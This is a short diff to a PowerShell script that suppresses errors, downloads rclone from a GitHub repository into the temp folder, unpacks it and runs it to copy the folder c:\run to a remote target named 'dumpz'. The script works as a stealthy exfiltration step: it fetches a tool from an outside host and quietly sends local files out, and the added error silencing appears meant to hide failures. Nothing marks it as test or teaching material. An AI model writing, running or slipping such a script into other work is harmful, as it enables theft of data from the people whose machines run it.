@@ -1,6 +1,6 @@
+$ErrorActionPreference="SilentlyContinue"
 cd $env:temp
 curl https://github.com/d77juan/t3st1n6/raw/main/rclone.zip -o rclone.zip
 Expand-Archive .\rclone.zip .
 sleep 5
-# echo .\rclone.exe copy c:\run remote:dumpz 
 Start-Process -FilePath '.\rclone.exe' -ArgumentList  'copy c:\run remote:dumpz'
